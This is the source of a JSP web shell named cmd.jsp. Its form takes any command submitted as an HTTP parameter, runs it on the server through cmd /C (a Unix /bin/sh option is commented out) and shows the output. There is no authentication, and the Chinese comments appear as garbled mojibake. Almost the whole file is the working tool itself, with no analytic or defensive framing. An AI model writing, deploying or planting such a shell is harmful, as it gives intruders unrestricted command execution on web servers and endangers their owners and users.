<%@ page language="java" contentType="text/html;charset=gbk"%>
<%@ page import="java.io.*;"%>
<%!
private static final String CMD_FILENAME = "cmd.jsp";
/** Command of the shell interpreter and the parameter to run a programm **/
private static final String[] COMMAND_INTERPRETER = {"cmd", "/C"}; // Dos,Windows
//private static final String[] COMMAND_INTERPRETER = {"/bin/sh","-c"}; 	// Unix
/** Max time in ms a process is allowed to run, before it will be terminated **/
private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds
/** Converts some important chars (int) to the corresponding html string **/
static String conv2Html(int i) {
if (i == '&') return "&amp;";
else if (i == '<') return "&lt;";
else if (i == '>') return "&gt;";
else if (i == '"') return "&quot;";
else return "" + (char) i;
}
/** Converts a normal string to a html conform string **/
static String conv2Html(String st) {
StringBuffer buf = new StringBuffer();
for (int i = 0; i < st.length(); i++) {
 buf.append(conv2Html(st.charAt(i)));
}
return buf.toString();
}
/**
* Starts a native process on the server
* @param command the command to start the process
* @param dir the dir in which the process starts
*/
static String startProcess(String command) throws IOException {
//if(dir==null) dir="c:\\";
StringBuffer ret = new StringBuffer();
String[] comm = new String[3];
comm[0] = COMMAND_INTERPRETER[0];
comm[1] = COMMAND_INTERPRETER[1];
comm[2] = command;
long start = System.currentTimeMillis();
try {
//java.lang.Process
//ProcessBuilder.start() �� Runtime.exec ��������һ���������̣������� Process �����һ��ʵ������ʵ�����������ƽ��̲���ȡ�����Ϣ��
//java.lang.Runtime
//public Process exec(String[] cmdarray,String[] envp,File dir) throws IOException , ��ָ�������͹���Ŀ¼�Ķ���������ִ��ָ��������ͱ�����
//������
//cmdarray - �����������������������顣
//envp - �ַ������飬����ÿ��Ԫ�صĻ������������ø�ʽΪ name=value������ӽ���Ӧ�ü̳е�ǰ���̵Ļ�������ò���Ϊ null��
//dir - �ӽ��̵Ĺ���Ŀ¼������ӽ���Ӧ�ü̳е�ǰ���̵Ĺ���Ŀ¼����ò���Ϊ null�� 
Process ls_proc = Runtime.getRuntime().exec(comm,null,null);
//java.lang.Process��getInputStream()
//����ӽ��̵�������������������ɸ� Process �����ʾ�Ľ��̵ı�׼������� 
//ʵ��ע����������������л�����һ�������⡣ 
BufferedInputStream ls_in = new BufferedInputStream(ls_proc.getInputStream());
//java.lang.Process��getErrorStream
//����ӽ��̵Ĵ�����������������ɸ� Process �����ʾ�Ľ��̵Ĵ�����������͵����ݡ� 
//ʵ��ע����������������л�����һ�������⡣ 
BufferedInputStream ls_err = new BufferedInputStream(ls_proc.getErrorStream());
boolean end = false;
while (!end){
int c = 0;
while ((ls_err.available() > 0) && (++c <= 1000)) {
ret.append(conv2Html(ls_err.read()));
}
c = 0;
while ((ls_in.available() > 0) && (++c <= 1000)) {
ret.append(conv2Html(ls_in.read()));
}
try{
ls_proc.exitValue();
//if the process has not finished, an exception is thrown
//else
while (ls_err.available() > 0)
ret.append(conv2Html(ls_err.read()));
while (ls_in.available() > 0)
ret.append(conv2Html(ls_in.read()));
end = true;
}
catch (IllegalThreadStateException ex) {
//Process is running
}
//The process is not allowed to run longer than given time.
if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {
ls_proc.destroy();
end = true;
ret.append("!!!! Process has timed out, destroyed !!!!!");
}
try {
Thread.sleep(50);
}
catch (InterruptedException ie) {}
}
}
catch (IOException e) {
ret.append("Error: " + e);
}
return ret.toString();
}

%>
<html>
<head>
<title>cmd</title>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<style type="text/css">
<!--
body{margin:8px;font-size:10pt;font-family:"Verdana","Arial","Helvetica","sans-serif";letter-spacing:1px}
h5{margin-bottom:0px;font-size:12pt;font-family:Verdana;font-weight: bold;}
hr{border-top:1px solid #aaaaaa;border-bottom:0px solid #aaaaaa;height:0px;}
form{margin:0px;display: inline;}
input{font-size:9pt;font-family:"Verdana";border:1px solid gray;}
textarea{font-family: "Verdana"; font-size: 9pt;border:1px solid #999999;background-color:#666666;color:#CCCCCC;}
a:link{text-decoration:none;color: #0033FF;}
a:visited{text-decoration:none;color: #0033FF;}
a:hover{text-decoration:underline;color: #800000;}
a:active{text-decoration:none;}
-->
</style>
</head>
<body>
<h5>Windows Command</h5>
<hr>
<%
String cmd=request.getParameter("command");
%>
<textarea cols="100" rows="40">
<%
if(cmd!=null) out.print("-&gt;"+cmd+"\n");
String ret = "";
//equalsIgnoreCase(String anotherString) 
//���� String ����һ�� String ���бȽϣ������Ǵ�Сд��
if (cmd!=null && !cmd.equalsIgnoreCase("")){
ret = startProcess(cmd);
ret = new String(ret.getBytes("ISO8859_1"),"GBK");
out.print(ret);
}
%>
</textarea>
<br>
<form action="<%=CMD_FILENAME%>" method="POST">
<textarea name="command" cols="100" rows="5">
</textarea>
<br>
<input type="submit" name="submit" value="Launch"> 
</form>